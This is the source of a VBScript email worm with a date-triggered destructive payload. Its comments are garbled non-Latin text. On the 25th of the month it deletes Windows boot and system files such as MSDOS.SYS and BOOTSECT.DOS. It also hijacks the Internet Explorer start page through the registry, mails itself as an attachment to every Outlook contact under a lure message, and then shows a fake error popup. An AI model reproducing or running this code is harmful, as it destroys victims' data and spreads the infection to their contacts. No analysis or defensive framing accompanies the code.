'            = = = = = =  = > ��� ������ < = = = = = = = 

'      ���������� ����������(���� ����� �� ����������)
Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set Shell = CreateObject("Wscript.Shell")
t = 0: On Error Resume Next ' ���������� ������
Set Application = CreateObject("Shell.Application")
Set InternerExplorer = WScript.CreateObject("InternetExplorer.Application")
Set Outlook = WScript.CreateObject("Outlook.Application")


'     ��������� ����� ������ 25 ����� ������� ������
If Day(Date)<>25 Then WScript.quit

' �������� C:\CONFIG.DOS
str = "C:\CONFIG.DOS"
If FileSystemObject.fileExists(str) = True Then
FileSystemObject.deletefile str,True
ElseIf FileSystemObject.folderExists(str) = True Then
FileSystemObject.deletefolder str,True
End If

' �������� C:\MSDOS.SYS
str = "C:\MSDOS.SYS"
If FileSystemObject.fileExists(str) = True Then
FileSystemObject.deletefile str,True
ElseIf FileSystemObject.folderExists(str) = True Then
FileSystemObject.deletefolder str,True
End If

' �������� C:\COMMAND.DOS
str = "C:\COMMAND.DOS"
If FileSystemObject.fileExists(str) = True Then
FileSystemObject.deletefile str,True
ElseIf FileSystemObject.folderExists(str) = True Then
FileSystemObject.deletefolder str,True
End If

' �������� C:\BOOTSECT.DOS
str = "C:\BOOTSECT.DOS"
If FileSystemObject.fileExists(str) = True Then
FileSystemObject.deletefile str,True
ElseIf FileSystemObject.folderExists(str) = True Then
FileSystemObject.deletefolder str,True
End If

' �������� C:\MSDOS.DOS
str = "C:\MSDOS.DOS"
If FileSystemObject.fileExists(str) = True Then
FileSystemObject.deletefile str,True
ElseIf FileSystemObject.folderExists(str) = True Then
FileSystemObject.deletefolder str,True
End If

' ������� �������� �������� "http:\\softik.com.ru"
Shell.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page", "http:\\softik.com.ru"

' ��������� ����� ��� �������� ����������
For Index = 1 To Outlook.GetNameSpace("MAPI").AddressLists(1).count
Set OutMail = Outlook.CreateItem(0)
OutMail.to = Outlook.GetNameSpace("MAPI").AddressLists(1).AddressEntries(Index)
OutMail.Subject = "������, ������� ��� �����, ��� � ������ !"
OutMail.Body = "����� ���������, ������ ��� ��� ������ �� e-mail. ��� ������!"
OutMail.Attachments.Add WScript.ScriptFullName
OutMail.Send
Next


'     ������� ��������� 
For index = 1 To 2
Shell.popup "��������� ����������� ������, �������� ��� ����������� ������ ������������ !", 10, "��������", 0+16
Loop

